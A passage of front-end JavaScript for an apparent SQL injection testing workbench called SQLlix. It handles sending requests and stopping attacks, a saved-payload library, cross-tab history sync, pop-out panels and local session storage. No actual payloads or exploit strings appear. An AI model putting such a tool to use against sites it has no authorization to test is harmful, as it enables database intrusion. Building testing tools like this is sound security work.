      if (typeof openVPanel === 'function') openVPanel('attack-config');
      else attackConfigPanel?.classList.add('open');
    });
    document.addEventListener('keydown', (e) => {
      if (e.key !== 'Enter') return;
      // Ctrl/Cmd+Enter → cancel in-flight / stop attack
      if (e.ctrlKey || e.metaKey) {
        e.preventDefault();
        cancelInFlightRequest();
        return;
      }
      // Plain Enter → send, only when focus is on URL (payload textarea needs newline)
      const t = e.target;
      if (t && (t.id === 'urlInput' || t.classList.contains('url-input'))) {
        e.preventDefault();
        sendRequest();
      }
    });

    /** Open a tool panel from the Tools picker: close picker, open float panel */
    function openToolFromPicker(toolName) {
      if (!VPANEL_MAP[toolName]) return;
      const toolsEl = $('#toolsPanel');
      if (toolsEl) toolsEl.classList.remove('open');
      openVPanel(toolName);
      if (toolName === 'proxy') {
        if (typeof window.renderProxyList === 'function') window.renderProxyList();
        if (typeof window.updateProxyToolbar === 'function') window.updateProxyToolbar();
      }
      if (toolName === 'cheatsheet' && typeof renderCheatSheet === 'function') {
        if (typeof cheatNav !== 'undefined') {
          cheatNav.view = 'home';
          cheatNav.dbId = null;
          cheatNav.q = '';
          cheatNav.detailId = null;
          cheatNav._ready = true;
        }
        renderCheatSheet();
      }
    }


    // Tools picker → open tool panels (proxy manager lives in proxy.js)
    (function bindToolsPicker() {
      document.querySelectorAll('[data-open-tool]').forEach((btn) => {
        btn.addEventListener('click', () => openToolFromPicker(btn.dataset.openTool));
      });
    })();

    // Attack stop overlay → static/js/attack.js


    // ===== Backend health (ping /api/health every 10s) =====
    const backendHealth = {
      online: null, // null=unknown, true/false
      lastMs: null,
      timer: null,
      floatDismissed: false,
    };

    async function checkBackendHealth() {
      const base = typeof apiBaseUrl === 'function' ? apiBaseUrl() : 'http://127.0.0.1:5000';
      const t0 = performance.now();
      let online = false;
      let detail = '';
      try {
        const ctrl = new AbortController();
        const to = setTimeout(() => ctrl.abort(), 3500);
        const res = await fetch(`${base}/api/health`, { method: 'GET', signal: ctrl.signal, cache: 'no-store' });
        clearTimeout(to);
        online = res.ok;
        const ms = Math.round(performance.now() - t0);
        backendHealth.lastMs = ms;
        detail = online ? `${ms} ms` : `HTTP ${res.status}`;
      } catch {
        online = false;
        backendHealth.lastMs = null;
        detail = 'unreachable';
      }
      const prev = backendHealth.online;
      backendHealth.online = online;
      updateBackendStatusUI();
      // Show floating neon banner only on transition to offline (or stay offline)
      if (!online) {
        if (!backendHealth.floatDismissed) showBackendOfflineFloat();
      } else {
        backendHealth.floatDismissed = false;
        hideBackendOfflineFloat();
      }
      return online;
    }

    function updateBackendStatusUI() {
      const foot = $('#wBackendStatus');
      const label = $('#wBackendLabel');
      const detail = $('#wBackendDetail');
      if (!foot) return;
      foot.classList.remove('is-online', 'is-offline', 'is-checking');
      if (backendHealth.online === null) {
        foot.classList.add('is-checking');
        if (label) label.textContent = 'Checking backend…';
        if (detail) detail.textContent = 'ping /api/health';
      } else if (backendHealth.online) {
        foot.classList.add('is-online');
        if (label) label.textContent = 'Backend online';
        if (detail) detail.textContent = backendHealth.lastMs != null ? `${backendHealth.lastMs} ms · :5000` : 'ok · :5000';
      } else {
        foot.classList.add('is-offline');
        if (label) label.textContent = 'Backend offline';
        if (detail) detail.textContent = 'start app.py on :5000';
      }
    }

    function showBackendOfflineFloat() {
      const el = $('#backendOfflineFloat');
      if (el) el.hidden = false;
    }
    function hideBackendOfflineFloat() {
      const el = $('#backendOfflineFloat');
      if (el) el.hidden = true;
    }

    function startBackendHealthLoop() {
      if (backendHealth.timer) clearInterval(backendHealth.timer);
      checkBackendHealth();
      backendHealth.timer = setInterval(checkBackendHealth, 10000);
      $('#backendRetryBtn')?.addEventListener('click', () => {
        backendHealth.floatDismissed = false;
        checkBackendHealth();
      });
      $('#backendFloatDismiss')?.addEventListener('click', () => {
        backendHealth.floatDismissed = true;
        hideBackendOfflineFloat();
      });
    }

    // ===== Payload library (manual save only, persisted) =====
    const PAYLOAD_LIB_KEY = 'sqllix-payload-library';
    let payloadLibrary = [];

    function loadPayloadLibrary() {
      try {
        const raw = localStorage.getItem(PAYLOAD_LIB_KEY);
        const arr = raw ? JSON.parse(raw) : [];
        payloadLibrary = Array.isArray(arr) ? arr : [];
      } catch { payloadLibrary = []; }
    }
    function savePayloadLibrary() {
      try { localStorage.setItem(PAYLOAD_LIB_KEY, JSON.stringify(payloadLibrary)); } catch {}
    }

    function openPayloadLibrary() {
      if (typeof openVPanel === 'function') openVPanel('payload-lib');
      else {
        const el = $('#payloadLibPanel');
        if (el) el.classList.add('open');
      }
      renderPayloadLibrary();
      setTimeout(() => $('#payloadLibSearch')?.focus(), 40);
    }
    function closePayloadLibrary() {
      if (typeof closeVPanel === 'function') closeVPanel('payload-lib');
      else $('#payloadLibPanel')?.classList.remove('open');
    }

    function renderPayloadLibrary() {
      const body = $('#payloadLibBody');
      if (!body) return;
      const q = ($('#payloadLibSearch')?.value || '').trim().toLowerCase();
      let list = [...payloadLibrary];
      // pinned first
      list.sort((a, b) => (b.pinned ? 1 : 0) - (a.pinned ? 1 : 0) || (b.ts || 0) - (a.ts || 0));
      if (q) {
        list = list.filter((p) =>
          (p.name || '').toLowerCase().includes(q) ||
          (p.text || '').toLowerCase().includes(q)
        );
      }
      if (!list.length) {
        body.innerHTML = `<div class="payload-lib-empty">${payloadLibrary.length ? 'No matches.' : 'No saved payloads yet. Write a payload and hit Save.'}</div>`;
        return;
      }
      body.innerHTML = list.map((p) => {
        const preview = escapeHtml((p.text || '').split('\n').slice(0, 3).join('\n')).slice(0, 180);
        return `
          <div class="payload-lib-item${p.pinned ? ' pinned' : ''}" data-id="${escapeHtml(p.id)}">
            <div class="payload-lib-top">
              <span class="payload-lib-name" title="${escapeHtml(p.name || '')}">${p.pinned ? '★ ' : ''}${escapeHtml(p.name || 'Untitled')}</span>
              <div class="payload-lib-actions">
                <button type="button" data-act="pin" title="Pin">${p.pinned ? '★' : '☆'}</button>
                <button type="button" data-act="del" class="danger" title="Delete">×</button>
              </div>
            </div>
            <div class="payload-lib-preview">${preview || '<i>empty</i>'}</div>
          </div>`;
      }).join('');

      body.querySelectorAll('.payload-lib-item').forEach((el) => {
        el.addEventListener('click', (e) => {
          if (e.target.closest('button')) return;
          const id = el.dataset.id;
          const item = payloadLibrary.find((x) => x.id === id);
          if (!item || !payloadInput) return;
          payloadInput.value = item.text || '';
          if (typeof updatePayloadSummary === 'function') updatePayloadSummary();
          if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
          closePayloadLibrary();
          showToast('Payload loaded', 'success');
        });
        el.querySelector('[data-act="pin"]')?.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = el.dataset.id;
          const item = payloadLibrary.find((x) => x.id === id);
          if (!item) return;
          item.pinned = !item.pinned;
          savePayloadLibrary();
          renderPayloadLibrary();
        });
        el.querySelector('[data-act="del"]')?.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = el.dataset.id;
          const item = payloadLibrary.find((x) => x.id === id);
          if (!item) return;
          if (!confirm(`Delete saved payload "${item.name || 'Untitled'}"?`)) return;
          payloadLibrary = payloadLibrary.filter((x) => x.id !== id);
          savePayloadLibrary();
          renderPayloadLibrary();
          showToast('Deleted', 'success');
        });
      });
    }

    function saveCurrentPayloadToLibrary() {
      const text = (payloadInput?.value || '');
      if (!text.trim()) {
        showToast('Payload is empty');
        return;
      }
      const first = text.trim().split('\n')[0].slice(0, 48);
      let name = prompt('Name for this payload:', first || 'Payload');
      if (name === null) return;
      name = (name || '').trim() || first || 'Payload';
      payloadLibrary.unshift({
        id: 'pl-' + Date.now().toString(36),
        name,
        text,
        pinned: false,
        ts: Date.now(),
      });
      savePayloadLibrary();
      const saveBtn = $('#payloadSaveBtn');
      if (saveBtn) {
        saveBtn.classList.add('saved');
        saveBtn.textContent = 'Saved';
      }
      showToast('Payload saved', 'success');
    }

    function bindPayloadLibraryUI() {
      loadPayloadLibrary();
      $('#payloadLibraryBtn')?.addEventListener('click', (e) => {
        e.stopPropagation();
        const el = $('#payloadLibPanel');
        if (el?.classList.contains('open')) closePayloadLibrary();
        else openPayloadLibrary();
      });
      $('#payloadSaveBtn')?.addEventListener('click', (e) => {
        e.stopPropagation();
        saveCurrentPayloadToLibrary();
      });
      payloadInput?.addEventListener('input', () => {
        const saveBtn = $('#payloadSaveBtn');
        if (saveBtn?.classList.contains('saved')) {
          saveBtn.classList.remove('saved');
          saveBtn.textContent = 'Save';
        }
      });
      $('#payloadLibSearch')?.addEventListener('input', renderPayloadLibrary);
    }

    // ===== History persistence (cross-tab: main ↔ New tab History) =====
    const HISTORY_LS_KEY = 'sqli-workbench-history-v1';
    const HISTORY_MAX_ITEMS = 200;
    const HISTORY_BODY_MAX = 32 * 1024;
    let _historySaveTimer = null;
    let _historySaveSkip = false; // avoid echo when applying storage event

    function serializeHistoryForStorage() {
      const items = state.history.slice(-HISTORY_MAX_ITEMS).map((h) => {
        const copy = {
          id: h.id,
          name: h.name,
          method: h.method,
          url: h.url,
          originalUrl: h.originalUrl,
          payload: h.payload,
          postBody: h.postBody,
          headers: h.headers ? { ...h.headers } : {},
          response: h.response ? { ...h.response } : {},
          pinned: !!h.pinned,
          timestamp: h.timestamp,
          batchId: h.batchId || null,
          batchName: h.batchName || null,
          attackIndex: h.attackIndex != null ? h.attackIndex : null,
          note: h.note || '',
        };
        if (copy.response) {
          const body = copy.response.body;
          if (typeof body === 'string' && body.length > HISTORY_BODY_MAX) {
            copy.response.body = body.slice(0, HISTORY_BODY_MAX) + '\n…[truncated for sync]';
          }
          if (typeof copy.response.fixedHtml === 'string' && copy.response.fixedHtml.length > HISTORY_BODY_MAX) {
            copy.response.fixedHtml = copy.response.fixedHtml.slice(0, HISTORY_BODY_MAX);
          }
        }
        return copy;
      });
      return {
        history: items,
        nextId: state.nextId,
        attackSources: state.attackSources || {},
        activeHistoryId: state.activeHistoryId,
        ts: Date.now(),
      };
    }

    function saveHistoryToStorage() {
      if (_historySaveSkip) return;
      try {
        localStorage.setItem(HISTORY_LS_KEY, JSON.stringify(serializeHistoryForStorage()));
      } catch (e) {
        try {
          const slim = serializeHistoryForStorage();
          slim.history = slim.history.slice(-40).map((h) => {
            if (h.response) {
              h.response.body = typeof h.response.body === 'string' ? h.response.body.slice(0, 4000) : '';
              h.response.fixedHtml = null;
            }
            return h;
          });
          localStorage.setItem(HISTORY_LS_KEY, JSON.stringify(slim));
        } catch { /* ignore quota */ }
      }
    }

    function scheduleHistorySave() {
      clearTimeout(_historySaveTimer);
      _historySaveTimer = setTimeout(saveHistoryToStorage, 120);
    }

    function loadHistoryFromStorage() {
      try {
        const raw = localStorage.getItem(HISTORY_LS_KEY);
        if (!raw) return false;
        const data = JSON.parse(raw);
        if (!data || !Array.isArray(data.history)) return false;
        state.history = data.history;
        if (typeof data.nextId === 'number') {
          state.nextId = Math.max(state.nextId || 1, data.nextId);
        }
        if (data.attackSources && typeof data.attackSources === 'object') {
          state.attackSources = data.attackSources;
        }
        if (data.activeHistoryId != null) state.activeHistoryId = data.activeHistoryId;
        return true;
      } catch {
        return false;
      }
    }

    function applyHistoryFromStorageEvent(raw) {
      clearTimeout(_historySaveTimer);
      _historySaveSkip = true;
      try {
        const data = JSON.parse(raw || 'null');
        if (!data || !Array.isArray(data.history)) return;
        state.history = data.history;
        if (typeof data.nextId === 'number') {
          state.nextId = Math.max(state.nextId || 1, data.nextId);
        }
        if (data.attackSources && typeof data.attackSources === 'object') {
          state.attackSources = data.attackSources;
        }
        if (typeof renderHistory === 'function') renderHistory();
        if (typeof renderHfChips === 'function') renderHfChips();
      } catch { /* ignore */ }
      // Keep skip until after debounced window so renderHistory side-effects don't echo
      setTimeout(() => { _historySaveSkip = false; }, 250);
    }

    /** Keep --topbar-h in sync so drawers sit below the top bar (header always visible). */
    function syncTopbarHeight() {
      const tb = document.querySelector('.top-bar');
      if (!tb) return;
      // Solo Settings / History hide the top-bar → offset 0
      // Solo Payload keeps the top-bar (URL/method/Send) → measure it
      if (document.body.classList.contains('solo-panel') && !document.body.classList.contains('solo-payload')) {
        document.documentElement.style.setProperty('--topbar-h', '0px');
        return;
      }
      const h = Math.ceil(tb.getBoundingClientRect().height);
      document.documentElement.style.setProperty('--topbar-h', (h > 0 ? h : 56) + 'px');
    }

    // ===== Solo panel / Open in new browser tab =====
    // ?panel=settings | ?panel=payload | ?panel=history
    // Sync via localStorage + `storage` event (simple, no BroadcastChannel).

    const PAYLOAD_DRAFT_KEY = 'sqli-workbench-payload-draft';

    function getSoloPanelName() {
      try {
        const q = new URLSearchParams(window.location.search);
        const p = (q.get('panel') || '').trim().toLowerCase();
        return p || null;
      } catch {
        return null;
      }
    }

    const soloPanel = getSoloPanelName();
    const isSoloSettings = soloPanel === 'settings';
    const isSoloPayload = soloPanel === 'payload';
    const isSoloHistory = soloPanel === 'history';

    const SOLO_PANEL_META = {
      settings: {
        el: '#settingsPanel',
        title: 'Settings — SQLlix',
        bodyClass: 'solo-settings',
        windowName: 'sqllix-settings',
      },
      payload: {
        el: '#payloadWorkbench',
        title: 'Payload — SQLlix',
        bodyClass: 'solo-payload',
        windowName: 'sqllix-payload',
      },
      history: {
        el: '#historyPanel',
        title: 'History — SQLlix',
        bodyClass: 'solo-history',
        windowName: 'sqllix-history',
      },
    };

    /** Open panel in a real browser tab; close the in-page panel on the main tab. */
    function openPanelInNewTab(name) {
      const meta = SOLO_PANEL_META[name];
      if (!meta) {
        showToast('Unknown panel: ' + name);
        return false;
      }
      if (soloPanel === name) {
        showToast('Already in this tab');
        return false;
      }
      try {
        if (name === 'payload') {
          if (payloadInput) {
            try { localStorage.setItem(PAYLOAD_DRAFT_KEY, payloadInput.value || ''); } catch (e) {}
          }
          if (typeof saveTargetUrl === 'function') saveTargetUrl();
        }
        if (name === 'history' && typeof scheduleHistorySave === 'function') {
          try { scheduleHistorySave(); } catch (e) {}
        }
      } catch (e) { /* ignore persist errors */ }

      let href;
      try {
        const url = new URL(window.location.href);
        url.searchParams.set('panel', name);
        // avoid hash swallowing
        url.hash = '';
        href = url.href;
      } catch (e) {
        const base = (window.location.href || '').split('#')[0].split('?')[0];
        href = base + '?panel=' + encodeURIComponent(name);
      }

      console.info('[popout] opening', name, href);

      // Method 1: synthetic <a target="_blank"> — most reliable under popup policies
      let opened = false;
      try {
        const a = document.createElement('a');
        a.href = href;
        a.target = '_blank';
        a.rel = 'noopener noreferrer';
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        a.remove();
        opened = true;
      } catch (e) {
        console.warn('[popout] anchor click failed', e);
      }

      // Method 2: window.open fallback
      if (!opened) {
        try {
          const w = window.open(href, '_blank', 'noopener,noreferrer');
          opened = !!w;
          if (w) {
            try { w.focus(); } catch (e) {}
          }
        } catch (e) {
          console.warn('[popout] window.open failed', e);
        }
      }

      if (!opened) {
        showToast('Pop-up blocked — allow pop-ups, or open: ' + href);
        console.warn('[popout] blocked', href);
        // last resort: copy URL
        try {
          if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(href);
            showToast('Link copied — paste in a new tab');
          }
        } catch (e) {}
        return false;
      }

      if (!soloPanel && typeof closeVPanel === 'function') {
        try { closeVPanel(name); } catch (e) {}
      }
      showToast('Opened «' + name + '» in new tab', 'success');
      return true;
    }
    window.openPanelInNewTab = openPanelInNewTab;



    function bindSoloCloseButton(panelEl) {
      const closeBtn = panelEl && panelEl.querySelector('[data-close-panel]');
      if (!closeBtn) return;
      closeBtn.title = 'Close tab';
      closeBtn.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        window.close();
        setTimeout(() => showToast('You can close this browser tab', ''), 100);
      }, true);
    }

    function enterSoloPanelMode(name) {
      const meta = SOLO_PANEL_META[name];
      if (!meta) return;
      document.body.classList.add('solo-panel', meta.bodyClass);
      document.title = meta.title;

      const panel = $(meta.el);
      if (panel) {
        panel.classList.add('open');
        panel.classList.remove('pinned');
        activeVPanel = name;
        bindSoloCloseButton(panel);
      }
      if (typeof syncTopbarHeight === 'function') syncTopbarHeight();
    }

    function loadPayloadDraft() {
      try {
        const raw = localStorage.getItem(PAYLOAD_DRAFT_KEY);
        if (raw == null) return;
        if (payloadInput) payloadInput.value = raw;
        if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
      } catch { /* ignore */ }
    }

    function savePayloadDraft() {
      try {
        localStorage.setItem(PAYLOAD_DRAFT_KEY, payloadInput ? payloadInput.value : '');
      } catch { /* ignore */ }
    }

    let _payloadDraftTimer = null;
    function bindPayloadDraftSync() {
      payloadInput?.addEventListener('input', () => {
        clearTimeout(_payloadDraftTimer);
        _payloadDraftTimer = setTimeout(savePayloadDraft, 200);
      });
    }

    // Target URL + method shared across tabs (solo Payload needs this)
    const TARGET_URL_KEY = 'sqli-workbench-target-url';
    const TARGET_METHOD_KEY = 'sqli-workbench-target-method';
    let _targetUrlTimer = null;
    function saveTargetUrl() {
      try {
        if (urlInput) localStorage.setItem(TARGET_URL_KEY, urlInput.value || '');
        if (methodSelect) localStorage.setItem(TARGET_METHOD_KEY, methodSelect.value || 'GET');
      } catch { /* ignore */ }
    }
    function loadTargetUrl() {
      try {
        const u = localStorage.getItem(TARGET_URL_KEY);
        const m = localStorage.getItem(TARGET_METHOD_KEY);
        if (urlInput && u != null && !(urlInput.value || '').trim()) urlInput.value = u;
        if (methodSelect && m) methodSelect.value = m;
      } catch { /* ignore */ }
    }
    function bindTargetUrlSync() {
      loadTargetUrl();
      const schedule = () => {
        clearTimeout(_targetUrlTimer);
        _targetUrlTimer = setTimeout(saveTargetUrl, 150);
      };
      urlInput?.addEventListener('input', schedule);
      urlInput?.addEventListener('change', schedule);
      methodSelect?.addEventListener('change', schedule);
    }

    function bindPanelPopoutButtons() {
      if (window.__sqliPopoutBound) return;
      window.__sqliPopoutBound = true;
      const resolve = (el) => {
        if (!el) return null;
        return el.getAttribute('data-popout-panel')
          || (el.id === 'settingsPopoutBtn' ? 'settings'
            : el.id === 'payloadPopoutBtn' ? 'payload'
              : el.id === 'historyPopoutBtn' ? 'history' : null);
      };
      const handler = (e) => {
        const btn = e.target && e.target.closest && e.target.closest(
          '#settingsPopoutBtn, #payloadPopoutBtn, #historyPopoutBtn, [data-popout-panel]'
        );
        if (!btn) return;
        const name = resolve(btn);
        if (!name) return;
        // Must stay synchronous for browser to treat as user gesture
        e.preventDefault();
        e.stopPropagation();
        openPanelInNewTab(name);
      };
      // click = strongest user-activation signal for window.open / <a target=_blank>
      document.addEventListener('click', handler, true);
      [
        ['settingsPopoutBtn', 'settings'],
        ['payloadPopoutBtn', 'payload'],
        ['historyPopoutBtn', 'history'],
      ].forEach(([id, name]) => {
        const el = document.getElementById(id);
        if (el) el.setAttribute('data-popout-panel', name);
      });
    }


    function setPayloadToolsOpen(open) {
      const wrap = $('#payloadToolsWrap');
      const menu = $('#payloadToolsMenu');
      const btn = $('#payloadToolsBtn');
      const panel = $('#payloadWorkbench');
      if (!wrap || !menu || !btn) return;
      if (open) {
        // absolute under .payload-tools-wrap (position:relative).
        // Do NOT use position:fixed: .vpanel.float-center has transform, so
        // fixed is relative to the panel — menu was placed off-screen and
        // clipped by overflow:hidden (solo worked because transform:none).
        menu.hidden = false;
        menu.style.position = 'absolute';
        menu.style.top = 'calc(100% + 6px)';
        menu.style.right = '0';
        menu.style.left = 'auto';
        menu.style.zIndex = '5000';
        panel?.classList.add('tools-open');
        requestAnimationFrame(() => wrap.classList.add('open'));
        btn.setAttribute('aria-expanded', 'true');
      } else {
        wrap.classList.remove('open');
        panel?.classList.remove('tools-open');
        btn.setAttribute('aria-expanded', 'false');
        setTimeout(() => {
          if (!wrap.classList.contains('open')) menu.hidden = true;
        }, 180);
      }
    }

    function bindPayloadToolsMenu() {
      const wrap = $('#payloadToolsWrap');
      const btn = $('#payloadToolsBtn');
      const menu = $('#payloadToolsMenu');
      if (!wrap || !btn || !menu) return;

      let openTimer = null;
      let closeTimer = null;
      const clearTimers = () => {
        clearTimeout(openTimer);
        clearTimeout(closeTimer);
        openTimer = closeTimer = null;
      };

      const scheduleOpen = () => {
        clearTimeout(closeTimer);
        closeTimer = null;
        if (wrap.classList.contains('open')) return;
        clearTimeout(openTimer);
        openTimer = setTimeout(() => setPayloadToolsOpen(true), 90);
      };
      const scheduleClose = () => {
        clearTimeout(openTimer);
        openTimer = null;
        clearTimeout(closeTimer);
        closeTimer = setTimeout(() => setPayloadToolsOpen(false), 220);
      };

      // Hover to open — no extra click needed to reach Converter etc.
      wrap.addEventListener('mouseenter', scheduleOpen);
      wrap.addEventListener('mouseleave', scheduleClose);
      // Menu is position:fixed (outside wrap) — keep open while pointer is on it
      menu.addEventListener('mouseenter', () => {
        clearTimers();
        setPayloadToolsOpen(true);
      });
      menu.addEventListener('mouseleave', scheduleClose);

      // Click still toggles (touch / keyboard users)
      btn.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        clearTimers();
        setPayloadToolsOpen(!wrap.classList.contains('open'));
      });

      // Choosing an item closes the menu (handlers on items still run)
      menu.addEventListener('click', (e) => {
        const item = e.target.closest('.payload-tools-item');
        if (!item) return;
        clearTimers();
        setTimeout(() => setPayloadToolsOpen(false), 0);
      });

      document.addEventListener('click', (e) => {
        if (!wrap.classList.contains('open')) return;
        if (wrap.contains(e.target) || menu.contains(e.target)) return;
        clearTimers();
        setPayloadToolsOpen(false);
      });

      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && wrap.classList.contains('open')) {
          clearTimers();
          setPayloadToolsOpen(false);
        }
      });

      // Main-panel shortcuts (Tools menu is solo/new-tab only)
      $('#converterBtnEmbed')?.addEventListener('click', (e) => {
        e.stopPropagation();
        if (typeof openConverter === 'function') openConverter();
      });
      $('#payloadLibraryBtnEmbed')?.addEventListener('click', (e) => {
        e.stopPropagation();
        if (typeof openPayloadLibrary === 'function') openPayloadLibrary();
      });
      $('#charTableBtnEmbed')?.addEventListener('click', (e) => {
        e.stopPropagation();
        const badge = $('#charTableBadge');
        if (badge) badge.click();
        else if (typeof renderCharTable === 'function') renderCharTable();
      });
    }

    /** Live-sync shared data across browser tabs (same origin). */
    function bindCrossTabSync() {
      window.addEventListener('storage', (e) => {
        if (!e.key) return;
        if (e.key === HEADERS_LS_KEY) {
          loadPersistedHeaders();
          renderHeaders();
        } else if (e.key === APPEAR_KEY) {
          applyAppearance(loadAppearance());
        } else if (e.key === NP_KEY) {
          npConfig = loadNpConfig();
          syncNpSettingsUI();
          state.nightProtectMode = Math.max(0, Math.min(2, +npConfig.defaultMode || 0));
          state.nightProtect = state.nightProtectMode > 0;
          if (typeof syncNightProtectBtn === 'function') syncNightProtectBtn();
        } else if (e.key === COOKIE_META_KEY) {
          if ($('#cookieMgrOverlay')?.classList.contains('open')) {
            openCookieManager();
          }
        } else if (e.key === PAYLOAD_DRAFT_KEY) {
          if (payloadInput && e.newValue != null && payloadInput.value !== e.newValue) {
            const start = payloadInput.selectionStart;
            const end = payloadInput.selectionEnd;
            payloadInput.value = e.newValue;
            try {
              const len = payloadInput.value.length;
              payloadInput.setSelectionRange(Math.min(start, len), Math.min(end, len));
            } catch { /* ignore */ }
            if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
          }
        } else if (e.key === TARGET_URL_KEY) {
          if (urlInput && e.newValue != null && urlInput.value !== e.newValue) {
            urlInput.value = e.newValue;
          }
        } else if (e.key === TARGET_METHOD_KEY) {
          if (methodSelect && e.newValue && methodSelect.value !== e.newValue) {
            methodSelect.value = e.newValue;
          }
        } else if (e.key === HISTORY_LS_KEY) {
          applyHistoryFromStorageEvent(e.newValue);
        }
      });
    }

    // ===== Init =====
    // ===== Session Manager (Settings → General) =====
    const SESSION_CATEGORIES = [
      {
        id: 'history',
        label: 'Request History',
        desc: 'History rows + attack sources',
        keys: ['sqli-workbench-history-v1'],
        onClear: () => {
          state.history = [];
          state.attackSources = {};
          state.activeHistoryId = null;
          state.nextId = 1;
          if (typeof renderHistory === 'function') renderHistory();
          if (typeof clearResponseView === 'function') clearResponseView();
        },
      },
      {
        id: 'payload',
        label: 'Payload & Target',
        desc: 'Draft payload, target URL/method, URL suggestions',
        keys: [
          'sqli-workbench-payload-draft',
          'sqli-workbench-target-url',
          'sqli-workbench-target-method',
          'sqli-workbench-url-history-v1',
        ],
        onClear: () => {
          if (payloadInput) payloadInput.value = '';
          if (urlInput) urlInput.value = '';
          if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
        },
      },
      {
        id: 'headers',
        label: 'Headers & Cookies',
        desc: 'Request headers + cookie metadata',
        keys: ['sqli-workbench-headers', 'sqli-workbench-cookie-meta'],
        onClear: () => {
          if (typeof loadHeadersFromStorage === 'function') {
            /* after remove, re-render */
          }
          if (typeof renderHeaders === 'function') renderHeaders();
        },
      },
      {
        id: 'filters',
        label: 'History Filters',
        desc: 'Advanced filter rules',
        keys: ['sqli-workbench-hf-rules'],
        onClear: () => {
          state.hfRules = [];
          if (typeof renderHfChips === 'function') renderHfChips();
        },
      },
      {
        id: 'appearance',
        label: 'Appearance & Night Protect',
        desc: 'UI theme density + night protect settings',
        keys: ['sqli-workbench-appearance', 'sqli-workbench-nightprotect'],
      },
      {
        id: 'shortcuts',
        label: 'Keyboard Shortcuts',
        desc: 'Custom shortcut bindings',
        keys: ['sqli-workbench-shortcuts-v3', 'sqli-workbench-shortcuts-v2', 'sqli-workbench-shortcuts'],
      },
      {
        id: 'tools',
        label: 'Tools data',
        desc: 'Cheat pins, payload library, proxies',
        keys: ['sqli-workbench-cheat-pins', 'sqllix-payload-library', 'sqli-workbench-proxies-v1'],
      },
    ];

    function formatStorageBytes(n) {
      if (n < 1024) return n + ' B';
      if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
      return (n / (1024 * 1024)).toFixed(2) + ' MB';
    }

    function measureLocalKey(key) {
      try {
        const v = localStorage.getItem(key);
        if (v == null) return 0;
        // rough UTF-16 storage cost
        return key.length * 2 + v.length * 2;
      } catch (e) {
        return 0;
      }
    }

    function getSessionCategoryStats() {
      return SESSION_CATEGORIES.map((cat) => {
        let bytes = 0;
        const present = [];
        (cat.keys || []).forEach((k) => {
          const b = measureLocalKey(k);
          if (b > 0) {
            bytes += b;
            present.push({ key: k, bytes: b });
          }
        });
        return { ...cat, bytes, present };
      });
    }

    function renderSessionManager() {
      const list = $('#sessionMgrList');
      const totalEl = $('#sessionMgrTotal');
      if (!list) return;
      const stats = getSessionCategoryStats();
      const total = stats.reduce((s, c) => s + c.bytes, 0);
      if (totalEl) totalEl.textContent = 'Total ≈ ' + formatStorageBytes(total);
      list.innerHTML = stats.map((c) => {
        const keysHtml = c.present.length
          ? c.present.map((p) =>
              `<div class="session-mgr-key"><code>${escapeHtml(p.key)}</code><span>${formatStorageBytes(p.bytes)}</span></div>`
            ).join('')
          : '<div class="session-mgr-empty">Empty</div>';
        return `<div class="session-mgr-card" data-cat="${escapeHtml(c.id)}">
          <div class="session-mgr-card-top">
            <div>
              <div class="session-mgr-label">${escapeHtml(c.label)}</div>
              <div class="session-mgr-desc">${escapeHtml(c.desc)}</div>
            </div>
            <div class="session-mgr-size">${formatStorageBytes(c.bytes)}</div>
          </div>
          <div class="session-mgr-keys">${keysHtml}</div>
          <button type="button" class="btn btn-sm session-mgr-clear" data-clear-cat="${escapeHtml(c.id)}" ${c.bytes ? '' : 'disabled'}>Clear</button>
        </div>`;
      }).join('');
      list.querySelectorAll('[data-clear-cat]').forEach((btn) => {
        btn.addEventListener('click', () => {
          const id = btn.dataset.clearCat;
          const cat = SESSION_CATEGORIES.find((c) => c.id === id);
          if (!cat) return;
          if (!confirm('Clear «' + cat.label + '» from this browser?')) return;
          (cat.keys || []).forEach((k) => {
            try { localStorage.removeItem(k); } catch (e) {}
          });
          if (typeof cat.onClear === 'function') {
            try { cat.onClear(); } catch (e) { console.warn(e); }
          }
          showToast('Cleared ' + cat.label, 'success');
          renderSessionManager();
        });
      });
    }

    function openSessionManager() {
      renderSessionManager();
      if (typeof openVPanel === 'function') openVPanel('session-mgr');
      else {
        const p = $('#sessionMgrPanel');
        if (p) p.classList.add('open');
      }
    }

    function bindSessionManagerUI() {
      $('#sessionMgrOpenBtn')?.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        openSessionManager();
      });
      $('#sessionMgrRefreshBtn')?.addEventListener('click', () => renderSessionManager());
      $('#sessionMgrClearAllBtn')?.addEventListener('click', () => {
        if (!confirm('Clear ALL SQLlix data stored in this browser?')) return;
        SESSION_CATEGORIES.forEach((cat) => {
          (cat.keys || []).forEach((k) => {
            try { localStorage.removeItem(k); } catch (e) {}
          });
          if (typeof cat.onClear === 'function') {
            try { cat.onClear(); } catch (e) {}
          }
        });
        // also wipe any leftover sqli* keys
        const toRemove = [];
        for (let i = 0; i < localStorage.length; i++) {
          const k = localStorage.key(i);
          if (k && /sqli|sqllix|workbench/i.test(k)) toRemove.push(k);
        }
        toRemove.forEach((k) => { try { localStorage.removeItem(k); } catch (e) {} });
        showToast('All SQLlix session data cleared', 'success');
        renderSessionManager();
      });
    }


    function init() {
      startBackendHealthLoop();
      bindPayloadLibraryUI();
      initAppearanceControls();
      // Night Protect defaults from localStorage
      npConfig = loadNpConfig();
      state.nightProtectMode = Math.max(0, Math.min(2, +npConfig.defaultMode || 0));
      state.nightProtect = state.nightProtectMode > 0;
      syncNpSettingsUI();
      bindNpSettingsUI();
      if (typeof syncNightProtectBtn === 'function') syncNightProtectBtn();


      renderShortcutsList();
      renderHeaders();
      renderCheatSheet();
      renderHfChips();
      loadHistoryFromStorage();
      renderHistory();
      urlInput.value = '';
      payloadInput.value = '';
      loadPayloadDraft();
      refreshAttackPanel();
      // Show shortcut hints on nav buttons
